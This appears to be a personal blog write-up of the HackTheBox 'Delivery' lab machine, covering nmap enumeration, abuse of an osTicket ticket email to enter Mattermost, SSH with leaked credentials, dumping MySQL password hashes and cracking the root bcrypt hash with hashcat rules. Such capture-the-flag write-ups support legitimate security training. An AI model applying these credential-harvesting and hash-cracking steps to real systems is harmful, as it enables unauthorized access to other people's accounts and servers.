---
layout: post
title: [Delivery - Linux]
subtitle: HackTheBox
thumbnail-img: /assets/img/box_new.jpg
tags: [red]
---

This is my solution to the HackTheBox Delivery Linux box, another easy HTB box!

# Passage - Linux - 10.10.10.222

## Enumeration:

We start off with an nmap: 

`nmap -sC -sV 10.10.10.222`

Results:

```
tarting Nmap 7.80 ( https://nmap.org ) at 2021-01-20 23:14 EST
Nmap scan report for 10.10.10.222
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds
```

We see an open port on port 80, so we access the site in a web browser with the ip address. We then add delivery.htb and helpdesk.delivery.htb to /etc/hosts under the ip. 

Here, we see what appears to be a homepage with a "Helpdesk" link and a "Contact Us" link. Additionally, we see the site is being run on HTML5 UP.

## Getting In:

Clicking the two links, we find an osTicket support center along with mention of a MatterMost server that can be accessed with a @delivery.htb email. This information provides hints for gaining the foothold, possibly finding some credentials through the osTicket center and using them for the MatterMost server. 

After submitting a random ticket as a guest user the support center provides a message with the ticket id and an email (possible credentials).

We then go to the MatterMost server and create an account with the provided email. It asks for email verification, and the link to verification can be accessed by using our ticket number and email entered in the ticket process with the search ticket option. 

This verification provides access to the MatterMost server, where user "root" provides the following server credentials: 

```
User: maildeliver
Pass: Youve_G0t_Mail!
```

With an open ssh port in the nmap scan, we can now ssh in with these creds, and cat the user flag.

## Root:

The root user provides some more hints in the MatterMost chat:

```
Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

PleaseSubscribe may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases. 
```

There are also a few more users in the chat that could serve as possible credentials.

Now we want to search for the hashes mentioned by the root user on the ssh.

```
find / name "mattermost" > hits.txt
```

```
cat hits.txt | grep "mattermost"
```

Here, we find the directory "/opt/mattermost", and in that directory "/opt/mattermost/config", we find "config.json".

After opening config.json, under SQLSettings we find: "mmuser:Crack_The_MM_Admin_PW", which are creds for the SQL server. 

We can then login to mysql:

`mysql -h localhost -u mmuser -p Crack_The_MM_Admin_PW`

```
show databases;
use mattermost;
show tables;
select * from users;
select Username,Password from Users;
```

This gives us the root hash.

We now locate the hashcat rule we want to use (I used best64.rule), and we also put the hash and "PleaseSubscribe!" into text files.

hashcat -r /usr/share/hashcat/rules/best64.rule --stdout word > best64wordlist.txt

Since the hash starts with $2a$10$, we know that the hash is BCrypt, so let's get to cracking!

```
hashcat -m 3200 -a 0 hash best64wordlist.txt --show
```

We then get the password "PleaseSubscribe!21"!

From maildeliverer, we `su root` with our password and gain root access!

We find the root flag in the root directory and win!